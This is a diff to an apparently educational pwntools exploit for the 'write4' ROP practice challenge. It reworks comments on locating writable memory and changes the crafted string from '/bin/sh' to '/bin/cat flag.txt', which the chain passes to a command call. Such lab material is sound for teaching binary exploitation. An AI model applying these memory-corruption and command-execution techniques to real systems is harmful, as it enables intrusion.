@@ -52,10 +52,15 @@ io = start()
 #
 # We need to find a place to store the string to be crafted,
 # and we want it to have a fixed address (assuming PIE is disabled).
-# We can look for writable sections using rabin2:
+# We could look for writable sections using rabin2:
 #
 #    $ rabin2 -S write4
 #
+# But the problem is that sections may be overlapped, so it's not
+# easy to understand whether a certain range of addresses is actually
+# writable. A better approach is to look at vmmap (gdb command),
+# which also shows address ranges and permissions.
+# Or even look at the program headers of the ELF (readelf -Wl).
 
 # Wait for the prompt.
 msg = io.recvuntil("> ")
@@ -85,9 +90,15 @@ def write_string(chain, addr, s):
 
     return chain
 
-dest_addr = 0x601000   # begin of a writable section
+# We will write somewhere in the middle of the range [0x601000,0x602000),
+# which is writable, as shown by vmmap. Writing to the beginning of
+# this range also works if we only write 8 bytes (writing more than
+# that will crash the program before we can get to execute the
+# desired command... remember that we are corrupting memory, so who
+# knows why we get a crash).
+dest_addr = 0x601f00
 
-vector = write_string(vector, dest_addr, '/bin/sh')
+vector = write_string(vector, dest_addr, '/bin/cat flag.txt')
 
 # Append the address of a 'pop rdi; ret' gadget,
 # and the value of rdi (address of the crafted string).
